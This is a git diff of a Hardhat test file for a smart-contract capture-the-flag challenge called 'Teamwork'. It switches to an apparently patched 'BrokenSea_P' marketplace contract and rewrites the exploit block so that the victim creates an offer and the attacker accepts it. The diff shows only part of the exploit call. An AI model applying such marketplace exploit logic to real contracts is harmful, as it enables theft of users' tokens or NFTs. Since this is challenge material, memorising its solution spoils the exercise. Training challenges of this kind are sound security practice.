@@ -12,14 +12,14 @@ describe('[Challenge] Teamwork', function () {
 
         const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
         const DamnValuableNFTFactory = await ethers.getContractFactory('DamnValuableNFT', deployer);
-        const BrokenSeaFactory = await ethers.getContractFactory("BrokenSea", deployer);
-        
+        const BrokenSeaFactory = await ethers.getContractFactory("BrokenSea_P", deployer);
+
         this.token = await DamnValuableToken.deploy();
         this.nft = await DamnValuableNFTFactory.deploy();
         this.brokenSea = await BrokenSeaFactory.deploy();
 
         await this.token.transfer(attacker.address, ethers.utils.parseEther('1'));
-        
+
         await this.nft.safeMint(victim.address);
         await this.nft.safeMint(victim.address);
         await this.nft.safeMint(victim.address);
@@ -29,7 +29,7 @@ describe('[Challenge] Teamwork', function () {
 
         await this.nft.connect(attacker).setApprovalForAll(this.brokenSea.address,true);
         await this.token.connect(attacker).approve(this.brokenSea.address,ethers.utils.parseEther('1000'));
-        
+
 
         expect(
             await this.nft.ownerOf(1)
@@ -38,15 +38,15 @@ describe('[Challenge] Teamwork', function () {
         expect(
             await this.token.balanceOf(attacker.address)
         ).to.equal(ethers.utils.parseEther('1'));
-     
+
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
-       
-        await this.brokenSea.connect(victim).createBid(this.nft.address,3,this.token.address,1);
 
-        await this.brokenSea.connect(attacker).acceptBid(
+        await this.brokenSea.connect(victim).createOffer(this.nft.address, 1, this.token.address, 10000);
+
+        await this.brokenSea.connect(attacker).acceptOffer(
             victim.address,
             this.token.address,
             1,
@@ -60,4 +60,3 @@ describe('[Challenge] Teamwork', function () {
     });
 
 });
-
